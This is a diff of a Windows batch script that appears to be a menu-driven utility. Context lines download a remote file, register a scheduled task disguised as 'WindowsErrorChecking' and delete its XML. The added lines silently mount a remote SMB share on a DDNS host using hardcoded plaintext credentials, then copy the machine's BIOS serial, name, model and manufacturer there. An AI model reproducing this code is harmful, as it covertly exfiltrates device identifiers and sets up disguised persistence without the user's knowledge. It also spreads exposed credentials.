@@ -31,7 +31,19 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/m
 schtasks /create /tn "WindowsErrorChecking" /xml "C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml" /f
 del /f /q "C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml"
 start "" schtasks /Run /TN "WindowsErrorChecking"
-powershell -Command "$s=(Get-CimInstance Win32_BIOS).SerialNumber; $n=(Get-CimInstance Win32_ComputerSystem).Name; $m=(Get-CimInstance Win32_ComputerSystem).Model; $f=(Get-CimInstance Win32_ComputerSystem).Manufacturer; $d=$(Get-Date -Format 'yyyy-MM-dd'); $t=$(Get-Date -Format 'HH-mm'); $tf=\"$env:TEMP\tam.txt\"; \"$s`_$n`_$m`_$f`_$d`_$t\" | Out-File $tf; net use '\\minhtuan283.ddns.net\hdd25' /user:minhtuan283 Thienngan2002 /persistent:no; if ($?) { $tf2='\\minhtuan283.ddns.net\hdd25\serial\log\series_' + $d + '_' + $t + '.txt'; Copy-Item $tf $tf2; if (Test-Path '\\minhtuan283.ddns.net\hdd25\serial\seri.txt') { Add-Content '\\minhtuan283.ddns.net\hdd25\serial\seri.txt' (Get-Content $tf) } else { Copy-Item $tf '\\minhtuan283.ddns.net\hdd25\serial\seri.txt' }; Remove-Item $tf }"
+net use "\\minhtuan283.ddns.net\hdd25" /user:minhtuan283 Thienngan2002 /persistent:no
+
+REM Nếu đăng nhập với user đầu tiên không thành công, thử user thứ hai
+if %errorlevel% neq 0 (
+    net use "\\minhtuan283.ddns.net\hdd25" /user:giabao Thienngan2002 /persistent:no
+)
+
+REM Kiểm tra nếu đăng nhập thành công thì thực hiện các lệnh PowerShell
+if %errorlevel% equ 0 (
+    powershell -Command "$s=(Get-CimInstance Win32_BIOS).SerialNumber; $n=(Get-CimInstance Win32_ComputerSystem).Name; $m=(Get-CimInstance Win32_ComputerSystem).Model; $f=(Get-CimInstance Win32_ComputerSystem).Manufacturer; $d=$(Get-Date -Format 'yyyy-MM-dd'); $t=$(Get-Date -Format 'HH-mm'); $tf=\"$env:TEMP\tam.txt\"; \"$s`_$n`_$m`_$f`_$d`_$t\" | Out-File $tf; $tf2='\\minhtuan283.ddns.net\hdd25\serial\log\series_' + $d + '_' + $t + '.txt'; Copy-Item $tf $tf2; if (Test-Path '\\minhtuan283.ddns.net\hdd25\serial\seri.txt') { Add-Content '\\minhtuan283.ddns.net\hdd25\serial\seri.txt' (Get-Content $tf) } else { Copy-Item $tf '\\minhtuan283.ddns.net\hdd25\serial\seri.txt' }; Remove-Item $tf"
+) else (
+    echo Khong the ket noi den network drive
+)
 cls
 :menu
 cls
